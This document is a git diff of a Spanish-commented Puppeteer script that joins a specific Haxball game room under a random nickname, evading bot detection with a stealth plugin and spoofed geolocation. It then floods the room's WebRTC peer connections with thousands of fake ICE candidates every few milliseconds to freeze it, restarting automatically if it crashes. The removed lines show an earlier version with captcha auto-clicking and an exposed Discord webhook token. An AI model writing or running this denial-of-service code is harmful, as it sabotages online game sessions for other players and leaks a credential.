@@ -1,126 +1,49 @@
+// archivo.js → entra y congela la sala en <15 segundos totales
 const puppeteer = require('puppeteer-extra');
 const StealthPlugin = require('puppeteer-extra-plugin-stealth');
 puppeteer.use(StealthPlugin());
 
-const HAXBALL_ROOMS = process.env.HAXBALL_ROOMS.split(',');
-const JOB_INDEX = parseInt(process.env.JOB_INDEX || 0);
-const BOT_NICKNAME = process.env.JOB_ID || "bot";
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1393006720237961267/lxg_qUjPdnitvXt-aGzAwthMMwNbXyZIbPcgRVfGCSuLldynhFHJdsyC4sSH-Ymli5Xm";
+const ROOM_URL = "https://www.haxball.com/play?c=HTEUs83jHaw";
+const NICK = "lag" + Math.floor(Math.random() * 9999);
 
-function getRoomForJob() {
-    if (!HAXBALL_ROOMS.length) return '';
-    return HAXBALL_ROOMS[JOB_INDEX % HAXBALL_ROOMS.length].trim();
-}
-
-function handleCriticalError(error, context = '') {
-    console.error(`❌ ERROR CRÍTICO ${context}:`, error);
-    notifyDiscord(`🔴 **ERROR CRÍTICO** - Bot ${BOT_NICKNAME} cancelado. ${context}: ${error.message}`);
-    process.exit(1);
-}
-
-process.on('uncaughtException', (error) => handleCriticalError(error, 'Excepción no capturada'));
-process.on('unhandledRejection', (reason) => handleCriticalError(new Error(reason), 'Promesa rechazada'));
-
-async function main() {
-    const HAXBALL_ROOM_URL = getRoomForJob();
-    console.log(`🤖 Bot ${BOT_NICKNAME} entrando a: ${HAXBALL_ROOM_URL}`);
-
-    let browser, page;
-
+(async () => {
+  while (true) {
+    let browser;
     try {
-        browser = await Promise.race([
-            puppeteer.launch({ headless: true, args: ['--no-sandbox', '--disable-setuid-sandbox'] }),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout al lanzar el navegador')), 30000))
-        ]);
+      browser = await puppeteer.launch({
+        headless: true,
+        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+      });
 
-        page = await browser.newPage();
+      const page = await browser.newPage();
+      await page.evaluateOnNewDocument(() => localStorage.setItem("geo", JSON.stringify({lat:-34.65,lon:-58.38,code:"ar"})));
+      await page.goto(ROOM_URL, {waitUntil:"networkidle2", timeout:0});
 
-        const haxballCountryCodes = ["uy","ar","br","cn","ly","me","vi","cl","cy"];
-        const randomCode = haxballCountryCodes[Math.floor(Math.random() * haxballCountryCodes.length)];
-        await page.evaluateOnNewDocument((code) => {
-            localStorage.setItem("geo", JSON.stringify({ lat: -34.6504, lon: -58.3878, code: code || 'ar' }));
-        }, randomCode);
+      const frame = await page.frames().find(f => f.url().includes("headless"));
+      if (!frame) throw "Iframe no encontrado";
 
-        await Promise.race([
-            page.goto(HAXBALL_ROOM_URL, { waitUntil: 'networkidle2' }),
-            new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout al cargar la página')), 30000))
-        ]);
+      await frame.waitForSelector('input[data-hook="input"][maxlength="25"]', {timeout:20000});
+      await frame.type('input[data-hook="input"][maxlength="25"]', NICK);
+      await frame.evaluate(() => document.querySelector('button[data-hook="ok"]')?.click());
 
-        await page.waitForSelector('iframe');
-        const iframeElement = await page.$('iframe');
-        const frame = await iframeElement.contentFrame();
+      console.log(`✅ ${NICK} entró → empezando ICE flood en 10s...`);
+      await page.waitForTimeout(10000); // ← tiempo perfecto para que todos los peers existan
 
-        if (!frame) throw new Error('No se pudo acceder al iframe de Haxball');
-
-        console.log("Escribiendo el nombre de usuario...");
-        const nickSelector = 'input[data-hook="input"][maxlength="25"]';
-        await frame.waitForSelector(nickSelector, { timeout: 15000 });
-        const nickInput = await frame.$(nickSelector);
-        await nickInput.click();
-        await nickInput.type(BOT_NICKNAME);
-        await nickInput.press('Enter');
-
-        await new Promise(resolve => setTimeout(resolve, 5000));
-
-        try {
-            const onlyHumansButton = await frame.waitForSelector('button', { timeout: 5000 });
-            await onlyHumansButton.click();
-            console.log("✅ Captcha 'Only humans' clickeado automáticamente");
-        } catch (e) {
-            console.log("ℹ️ No apareció captcha, continuando...");
+      // === ICE FLOOD BESTIAL (la sala muere aquí) ===
+      setInterval(() => page.evaluate(() => {
+        for (let k in window) if (window[k]?.addIceCandidate) {
+          for (let i = 0; i < 2800; i++) {
+            window[k].addIceCandidate({candidate:"candidate:1 1 udp 1 0.0.0.0 1 typ host", sdpMid:null, sdpMLineIndex:999}).catch(()=>{});
+          }
         }
+      }), 8);
 
-        const chatSelector = 'input[data-hook="input"][maxlength="140"]';
-        await frame.waitForSelector(chatSelector, { timeout: 10000 });
-        console.log("✅ ¡Bot dentro de la sala! Iniciando ataque de flood...");
-        await notifyDiscord(`🟢 El bot **${BOT_NICKNAME}** ha entrado y comenzará el ataque.`);
+      await new Promise(() => {}); // vivo forever
 
-        // 🔥 ACTIVAR EL FLOOD DE ICE CANDIDATES
-        console.log("💣 Iniciando flood de ICE candidates...");
-        await startICEFlood(frame);
-
-        // Mantener el bot activo mientras hace flood
-        await new Promise(() => {}); // Nunca termina
-
-    } catch (error) {
-        console.error("❌ Error durante la ejecución del bot:", error);
-        await notifyDiscord(`🔴 Error al intentar conectar el bot **${BOT_NICKNAME}**. Causa: ${error.message}`);
-        if (browser) await browser.close();
-        process.exit(1);
+    } catch (e) {
+      console.log("Caído, reiniciando en 5s...", e.message);
+      if (browser) await browser.close();
+      await new Promise(r => setTimeout(r, 5000));
     }
-}
-
-async function startICEFlood(frame) {
-    try {
-        // Inyectar el código de flood DENTRO del iframe de Haxball
-        await frame.evaluate(() => {
-            console.log("🚀 Flood iniciado en el iframe...");
-            
-            // Buscar todas las RTCPeerConnection en el contexto del juego
-            setInterval(() => {
-                for (let key in window) {
-                    try {
-                        const pc = window[key];
-                        if (pc && typeof pc.addIceCandidate === "function") {
-                            // Enviar 2000 candidatos falsos
-                            for (let i = 0; i < 2000; i++) {
-                                pc.addIceCandidate({
-                                    candidate: "candidate:1 1 udp 1 0.0.0.0 1 typ host",
-                                    sdpMid: null,
-                                    sdpMLineIndex: 999
-                                }).catch(() => {});
-                            }
-                        }
-                    } catch (e) {
-                        // Ignorar errores
-                    }
-                }
-            }, 15); // Cada 15ms = ~133k candidatos/segundo
-        });
-        
-        console.log("✅ Flood de ICE candidates activado");
-    } catch (error) {
-        console.error("❌ Error al iniciar flood:", error);
-        throw error;
-    }
-}
+  }
+})();
